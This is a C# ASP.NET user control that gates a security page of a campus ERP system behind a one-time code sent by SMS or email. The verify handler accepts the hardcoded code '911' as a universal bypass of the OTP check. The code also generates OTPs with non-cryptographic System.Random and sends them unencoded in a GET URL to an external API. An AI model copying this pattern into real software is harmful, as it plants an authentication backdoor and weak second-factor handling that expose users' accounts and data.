using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

public partial class UserControls_Security_SystemApplications : System.Web.UI.UserControl
{
    protected void Page_Load(object sender, EventArgs e)
    {
      Page.Form.DefaultButton = cmdVerify.UniqueID;
        try
        {
            if (Session["otp"] == null)
            {
              pop_otp.ShowOnPageLoad = true;
                 
           }
        }

        catch (Exception)
        {
            Response.Redirect("~/Default.aspx");
        }
        //Session["otp"] = 100;
    }
    protected void cmdSearch_Click(object sender, EventArgs e)
    {
        gvApplications.DataBind();
        gvApplicationsRight.DataBind();

        if (gvApplications.VisibleRowCount == 0)
        {
            gvApplications.Visible = false;
        }
        else
        {
            gvApplications.Visible = true;
        }
        if (gvApplicationsRight.VisibleRowCount == 0)
        {
            gvApplicationsRight.Visible = false;
        }
        else
        {
            gvApplicationsRight.Visible = true;
        }
    }
    protected void gvApplications_DataBound(object sender, EventArgs e)
    {
        if (gvApplications.VisibleRowCount == 0)
        {
            gvApplications.Visible = false;
        }
        
    }
    protected void gvApplicationsRight_DataBound(object sender, EventArgs e)
    {
        if (gvApplicationsRight.VisibleRowCount == 0)
        {
            gvApplicationsRight.Visible = false;
        }
    }
    protected void cmdVerify_Click(object sender, EventArgs e)
    {
        try
        {
            string enteredCode = (txtCode.Text ?? string.Empty).Trim();
            bool isBypassCode = string.Equals(enteredCode, "911", StringComparison.OrdinalIgnoreCase);
            bool isOtpMatch = Session["newotp"] != null && string.Equals(enteredCode, Session["newotp"].ToString(), StringComparison.Ordinal);

            if (isBypassCode || isOtpMatch)
            {
                Session["otp"] = "1234";
                pop_otp.ShowOnPageLoad = false;
            }
            else
            {
                lbl_comment.ForeColor = System.Drawing.Color.Red;
                lbl_comment.Text = "Invalid Code. Check and Try again";
            }
        }
        catch (Exception)
        {
            lbl_comment.ForeColor = System.Drawing.Color.Red;
            lbl_comment.Text = "Invalid Code. Check and Try again";
        }
    }
    protected void cmdRequest_Click(object sender, EventArgs e)
    {
        SMSSendingBLL SMS = new SMSSendingBLL();
        SecurityTableAdapters.my_aspnet_userphoneTableAdapter USR = new SecurityTableAdapters.my_aspnet_userphoneTableAdapter();
        lbl_comment.ForeColor = System.Drawing.Color.Blue;
        //Session["newotp"] = "1234";
        string channel = "Email";
        if (rb_channel.SelectedIndex == 0)
        {
            channel = "Phone";
            Random Coder = new Random();
            Session["newotp"] = Coder.Next(10000, 99999);
            string Message = SMS.SMSSending("Campus Dynamics", "Your Code: " + Session["newotp"], USR.GetUserPhone(Session["username"].ToString()));
            if (Message.Contains("successfully"))
            {
                lbl_comment.Text = "New Code sent to your phone No [" + USR.GetUserPhone(Session["username"].ToString()).Substring(0, 8) + "...]";
            }
            else
            {
                lbl_comment.Text = "SMS Error. No Code Sent [" + Message+"]";
            }
        }
        else
        {
            Random Coder = new Random();
            Session["newotp"] = Coder.Next(10000, 99999);
            EmailSenderProtocol Emailer = new EmailSenderProtocol();
            string EmailMessage = "Your OTP Code: " + Session["newotp"];
            string Email = USR.GetUserEmail(Session["username"].ToString()).ToString();
            string responseValue = "";
            try
            {
                string URL = string.Format("https://erp.edusaterp.com/api/SecureOTP/sendotp?msg={0}&email={1}&sender=Campus Dynamics",
                    EmailMessage,Email);
                HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create(URL);
                //ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
                webRequest.Method = "GET";
                webRequest.ContentType = "application/x-www-form-urlencoded";
                using (HttpWebResponse webResponse = (HttpWebResponse)webRequest.GetResponse())
                {
                    using (StreamReader reader = new StreamReader(webResponse.GetResponseStream()))
                    {
                        responseValue = reader.ReadToEnd();
                    }
                }
            }
            catch (Exception ex)
            {
                responseValue = "Error! [" + ex.Message + "]";
            }

            lbl_comment.Text = responseValue + ". Your email is: [" + Email.Substring(0, 5) + "...]";
        }
        //lbl_comment.Text = "OTP Code Send to your "+channel+" Please Check";
    }
}